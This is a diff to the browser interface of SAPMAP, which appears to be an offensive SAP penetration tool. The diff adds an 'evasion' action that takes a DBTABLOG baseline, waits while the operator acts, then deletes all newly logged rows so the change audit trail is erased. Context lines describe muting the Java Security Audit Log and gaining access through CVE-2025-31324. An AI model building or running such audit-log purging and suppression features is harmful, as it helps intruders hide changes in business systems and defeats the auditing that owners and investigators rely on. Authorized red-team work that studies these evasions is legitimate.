@@ -1051,6 +1051,9 @@ body {
       <div class="ctx-item" data-action="tier3_java_sal_suppress"
            title="Tier 3 MUTATION (Java). Deploys a LogController JSP and sets the 6 Java Security Audit Log categories (/System/Security/Audit + 5 subcategories) to Severity.NONE via Category.setEffectiveSeverity(). Runtime-only (JVM heap — no config file change, no NWA change-log entry). Auto-restores baseline severity on exit. Requires a Java deployment path (CVE-2025-31324, CTC, telnet, or GW)."
            >&#128683; Suppress Java SAL... (Tier 3 mutation)</div>
+      <div class="ctx-item" data-action="tier3_dbtablog_purge"
+           title="Tier 3 MUTATION (ABAP). Captures MAX(LOGID) baseline on DBTABLOG, waits hold_seconds, then DELETEs every row written after that point (optional TABNAME whitelist). DBTABLOG is delivery class L (not itself logged) — the DELETE does not recurse. No DD09L touch, no DDIC activation, no transport object. Requires RFC_ABAP_INSTALL_AND_RUN."
+           >&#129529; Purge DBTABLOG... (Tier 3 mutation)</div>
     </div>
   </div>
   <!-- Data Extraction submenu -->
@@ -4140,6 +4143,8 @@ function showCtxMenu(e, sid) {
     'tier3_java_sal_suppress': isJavaStack
         && (hasCve31324 || hasGwVuln || hasJavaDeploy)
         && !!(mapState.evasion && mapState.evasion.allow_evasion),
+    'tier3_dbtablog_purge': hasUsableAbapAccess
+        && !!(mapState.evasion && mapState.evasion.allow_evasion),
     'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
     'test_rfcs':        hasUsableAbapAccess && hasRFCs,
     'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
@@ -4365,6 +4370,10 @@ function showCtxMenu(e, sid) {
         ((mapState.evasion && mapState.evasion.allow_evasion)
          ? 'MUTATES Java runtime. Deploys a LogController JSP and calls Category.setEffectiveSeverity(Severity.NONE) on the 6 Java Security Audit Log categories (/System/Security/Audit + ACLs, Configuration, PermissionCheck, PrincipalModification, UserMapping). Runtime-only — JVM heap, no config file, no NWA change-log. Auto-restores baseline severity after hold window. Requires a JSP deployment path.'
          : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
+    'tier3_dbtablog_purge':
+        ((mapState.evasion && mapState.evasion.allow_evasion)
+         ? 'DELETES rows from DBTABLOG. Captures MAX(LOGID) baseline, sleeps hold_seconds (operator runs actions during this window — all table-logged DML lands in DBTABLOG normally), then DELETEs every row with LOGID > baseline (optionally narrowed by TABNAME whitelist). DBTABLOG is delivery class L (not itself logged) — DELETE does not recurse. No DD09L touch, no DDIC reactivation, no transport object. Self-managed baseline.'
+         : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
     'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
     'test_rfcs':        (!hasRFCs
         ? 'Retrieve RFC connections first.'
@@ -4468,6 +4477,7 @@ function showCtxMenu(e, sid) {
     'tier3_rdisp_trace_off': !isAbapStack,
     'tier3_sal_uname_narrow': !isAbapStack,
     'tier3_java_sal_suppress': !isJavaStack,
+    'tier3_dbtablog_purge': !isAbapStack,
     'retrieve_rfcs':    !isAbapStack,
     'test_rfcs':        !isAbapStack,
     'create_tcpip':          !isAbapStack,
@@ -5915,6 +5925,67 @@ async function ctxAction(action) {
         } else {
           delete activeTasks[jKey];
           clearInterval(jcdTimer);
+        }
+        updateActivityBar();
+      }, 1000);
+      break;
+    }
+    case 'tier3_dbtablog_purge': {
+      const dHoldRaw = prompt(
+        'Tier 3: Purge DBTABLOG on ' + sid + '\n\n'
+        + 'This captures MAX(LOGID) as a baseline, waits N seconds\n'
+        + 'while you run actions that would normally land in DBTABLOG,\n'
+        + 'then DELETEs every row with LOGID > baseline.\n\n'
+        + 'DBTABLOG is delivery-class L (not itself logged), so the\n'
+        + 'DELETE does not recurse. No DD09L touch, no DDIC change.\n\n'
+        + 'Hold for how many seconds before purge?',
+        '30');
+      if (!dHoldRaw) break;
+      const dHold = parseFloat(dHoldRaw);
+      if (isNaN(dHold) || dHold < 0 || dHold > 3600) {
+        showToast('Hold seconds must be 0–3600', 'warning');
+        break;
+      }
+      const dTabsRaw = prompt(
+        'TABNAME whitelist (comma-separated, e.g. USR02,USR04,T000)\n\n'
+        + 'Leave EMPTY to purge ALL tables since baseline (recommended\n'
+        + 'unless you know exactly which tables your action touched).',
+        '');
+      // Null = cancelled, empty string = "purge all" — keep cancel-vs-empty distinct.
+      if (dTabsRaw === null) break;
+      const dTabs = dTabsRaw.split(',').map(s => s.trim().toUpperCase())
+                            .filter(Boolean);
+      const dScope = dTabs.length
+        ? 'TABNAME IN (' + dTabs.join(', ') + ')'
+        : 'ALL tables';
+      if (!confirm(
+        'RUN Tier 3 DBTABLOG purge on ' + sid + '?\n\n'
+        + 'Hold:     ' + dHold + 's\n'
+        + 'Scope:    ' + dScope + '\n'
+        + 'Writer:   RFC_ABAP_INSTALL_AND_RUN (throwaway DELETE program)\n'
+        + 'Persist:  one-shot DELETE — no state to restore\n\n'
+        + 'During the hold window, perform the action whose audit you\n'
+        + 'want erased — it will hit DBTABLOG normally, then be purged.')) break;
+      flashActivity(
+        `${sid}: Tier 3 — DBTABLOG baseline + ${dHold}s hold...`, 5000);
+      await api('POST', `node/${sid}/tier3_dbtablog_purge`,
+                 {hold_seconds: dHold, tabname_filter: dTabs});
+      let dRemaining = Math.ceil(dHold);
+      const dKey = '_dbtablog_cd_' + sid;
+      activeTasks[dKey] =
+        '\u{1F9F9} DBTABLOG baseline set — ' + dRemaining + 's hold';
+      updateActivityBar();
+      const dcdTimer = setInterval(() => {
+        dRemaining--;
+        if (dRemaining > 0) {
+          activeTasks[dKey] =
+            '\u{1F9F9} DBTABLOG baseline set — ' + dRemaining + 's hold';
+        } else if (dRemaining === 0) {
+          activeTasks[dKey] =
+            '\u{1F525} DBTABLOG — purging rows since baseline...';
+        } else {
+          delete activeTasks[dKey];
+          clearInterval(dcdTimer);
         }
         updateActivityBar();
       }, 1000);
